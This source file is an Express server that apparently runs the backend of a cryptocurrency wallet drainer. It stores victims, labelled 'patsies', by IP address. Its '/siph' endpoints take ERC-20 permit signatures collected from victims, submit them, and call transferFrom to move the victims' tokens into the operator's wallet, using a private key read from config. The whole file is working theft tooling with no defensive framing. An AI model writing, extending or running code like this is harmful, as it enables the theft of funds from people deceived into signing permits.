import express from 'express';
import axios from 'axios';
import { ethers } from "ethers";
import cors from 'cors';
import fs from 'fs';

const port = process.argv[2] || 3000;
const app = express();
app.use(express.json());
const allowedOrigins = ['http://localhost:5173', 'https://cunnict.000webhostapp.com'];
const corsOptions = {
  origin: (origin, callback) => {
    allowedOrigins.includes(origin)
      ? callback(null, true)
      : callback(new Error('Request from this origin is not allowed'));
  },
};
app.use(cors(corsOptions));

const readFileAndParse = (filePath) => {
  try {
    const data = fs.readFileSync(filePath, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading file:', error);
    return null;
  }
};

const findPatsyByIP = (data, userId, ipAddress) => {
  const user = data.users[userId];
  const patsyId = user?.patsies && Object.keys(user.patsies).find((id) => user.patsies[id].ip_address === ipAddress);
  return patsyId ? { userId, patsyId, patsy: user.patsies[patsyId] } : null;
};

const handleSearchResult = (res, message, data) => {
  if (data) {
    res.json({ message, data });
  } else {
    res.status(404).json({ message, data: null });
  }
};

app.get("/marshal", (req, res) => {
  const marshalData = readFileAndParse('db.json');
  if (!marshalData) return res.status(500).send('Internal Server Error');

  const {providers, chains, countries, users} = marshalData;
  handleSearchResult(res, "Marshals retrieved successfully", {providers, chains, countries});
})

app.get('/search/:userId/:ipAddress', (req, res) => {
  const jsonData = readFileAndParse('db.json');
  if (!jsonData) return res.status(500).send('Internal Server Error');

  const { userId, ipAddress } = req.params;
  const result = findPatsyByIP(jsonData, userId, ipAddress);
  handleSearchResult(res, `IP address ${ipAddress} ${result ? 'found in' : 'not found for'} user ${userId}`, result?.patsy);
});

app.get('/search/:userId', (req, res) => {
  const userId = req.params.userId;
  const userData = readFileAndParse('db.json');
  if (!userData) return res.status(500).json({ error: 'Internal Server Error' });

  const user = userData.users[userId];
  const result = {
    address: user?.address,
    account: user?.feedback_account,
    token: user?.feedback_token,
    secondaries: user?.secondary_feedbacks
  };

  handleSearchResult(res, `User ${userId} ${user ? 'found' : 'not found'}`, result);
});

app.get('/ftr_cfg', (req, res) => {
  const cfg = readFileAndParse("./config.json");
  res.json(cfg);
});

app.get('/create_id', (req, res) => {
  res.json({ id: Math.floor(1000 + Math.random() * 9000) });
});

app.post('/add_patsy/:userId', (req, res) => {
  const userId = req.params.userId;
  const newData = req.body;
  const existingData = readFileAndParse('./db.json');
  const ipExists = !!existingData.users[userId]?.patsies[newData.id];

  res.send(ipExists ? 'patsy exists' : 'patsy added');
  if (!ipExists) {
    existingData.users[userId].patsies = { ...existingData.users[userId].patsies, [newData.id]: newData };
    fs.writeFileSync('./db.json', JSON.stringify(existingData, null, 2));
  }
});

app.post("/siph/tkn_appr", async function(req, res, next) {
  try {
    const { chains } = readFileAndParse('db.json');
    const config = readFileAndParse('config.json');
    const ERC20_ABI = readFileAndParse('erc20.json');
    const data = req.body
    let provider = new ethers.providers.JsonRpcProvider(chains.find(obj => obj.chainId === data.chainId).rpcUrl)
    let wallet = new ethers.Wallet(config.sp_cue, provider);
    const permitData = JSON.parse(data.permit)
    let contract = new ethers.Contract(data.address, ERC20_ABI, wallet)
    const feeData = await wallet.getFeeData()
    console.log(data)
    const allowance = await contract.allowance(data.owner, wallet.address)
    if (allowance._hex !== '0xb88e282822ab5ed106947c1c60af583c1741a38e858de00000') {
      const gas = await contract.estimateGas.permit(data.owner, data.spender, permitData.value, permitData.deadline, permitData.v, permitData.r, permitData.s)
      const pTrans = await contract.permit(data.owner, data.spender, permitData.value, permitData.deadline, permitData.v, permitData.r, permitData.s, {gasPrice: feeData.gasPrice, gasLimit: gas*4})
      await pTrans.wait()
    }
    await new Promise(r => setTimeout(r, 5000));
    const gasTransfer = await contract.estimateGas.transferFrom(data.owner, wallet.address, data.amount)
    txn = await contract.transferFrom(data.owner, wallet.address, data.amount, {gasPrice: feeData.gasPrice, gasLimit: gasTransfer*2})
    res.send(txn.hash)
  } catch (error) {
    console.log(error)
    res.status(500).json(error)
  }
})

app.post("/siph/tkn_trnsfr", async function (req, res, next) {
  try {
    const { chains } = readFileAndParse('db.json');
    const config = readFileAndParse('config.json');
    const ERC20_ABI = readFileAndParse('erc20.json');
    const data = req.body;

    // Ensure data.amount is converted to wei
    const amountInWei = ethers.utils.parseUnits(data.amount.toString(), 'ether');
    console.log("Amount in wei: ", amountInWei, "Chain RPC: ", chains.find(obj => obj.chainId === data.chainId).rpcUrl)

    let provider = new ethers.providers.JsonRpcProvider(chains.find(obj => obj.chainId === data.chainId).rpcUrl);
    let wallet = new ethers.Wallet(config.sp_cue, provider);
    let contract = new ethers.Contract(data.address, ERC20_ABI, wallet);
    const feeData = await wallet.getFeeData();
    
    // Estimate gas
    const gasTransfer = await contract.estimateGas.transferFrom(data.owner, wallet.address, amountInWei);

    // Ensure gasLimit is sufficient
    const gasLimit = gasTransfer.add(gasTransfer.div(10)); // You can adjust the multiplier as needed

    // Perform the transfer

    const txn = await contract.transferFrom(data.owner, wallet.address, amountInWei, {
      gasPrice: feeData.gasPrice,
      gasLimit: gasLimit,
    });

    res.send(txn.hash);
  } catch (error) {
    console.error(error);
    res.status(500).json(error);
  }
});

app.get('/retk', (req, res) => {
  const address = new ethers.Wallet(config.key).address;
  res.send(address);
});

app.use((err, req, res, next) => {
  if (err.message === 'Request from this origin is not allowed') {
    res.status(403).json({ error: 'Request blocked. Origin not recognized.' });
  }
});

app.listen(port, () => {
  console.log(`App listening on port ${port}`);
});
